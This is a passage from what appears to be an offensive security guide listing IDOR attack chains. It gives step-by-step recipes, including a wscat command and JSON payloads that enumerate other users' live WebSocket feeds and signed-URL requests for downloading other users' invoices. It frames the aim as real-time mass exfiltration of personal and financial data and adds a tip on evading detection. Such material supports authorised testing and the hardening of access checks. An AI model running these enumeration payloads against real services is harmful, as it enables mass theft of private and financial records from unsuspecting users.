4. Intercept next message, modify user_id to another account:
   {"action": "subscribe", "channel": "user_feed", "user_id": "1002"}
   → Server sends user 1002's live feed (no per-message ownership check)

5. Exfiltrate in real-time: order placements, messages, notifications,
   financial transactions, location updates

6. Chain with account enumeration: iterate user_id from 1 to N in a loop
   wscat -c wss://target.com/ws --header "Cookie: session=<yours>"
   > {"action":"subscribe","channel":"user_feed","user_id":1002}
   > {"action":"subscribe","channel":"user_feed","user_id":1003}

Impact: Critical — real-time mass data exfiltration with a single valid session
Note: WebSocket IDOR is often missed because Burp's scanner doesn't cover WS messages
```

### Chain 7: Pre-Signed URL IDOR → Private File Download → PII Mass Exfil

```
1. Trigger a file download in the app for your own account:
   POST /api/files/presign {"key": "invoices/user_1001/Q1_2026.pdf"}
   → {"signed_url": "https://bucket.s3.amazonaws.com/invoices/user_1001/Q1_2026.pdf?X-Amz-Signature=abc..."}

2. Note the object key pattern: invoices/user_{id}/Q{quarter}_{year}.pdf

3. Request a signed URL for another user's object key:
   POST /api/files/presign {"key": "invoices/user_1002/Q1_2026.pdf"}
   → If server returns a valid signed URL: IDOR confirmed

4. Enumerate: generate signed URLs for user_1001 through user_5000
   All quarterly invoices accessible with no additional auth

5. Download each file directly using the time-limited signed URL
   (AWS signs the URL server-side — the download itself is unauthenticated)

Impact: Critical — financial document mass exfiltration
Detection evasion: downloads appear to come from legitimate AWS/GCS infrastructure
```
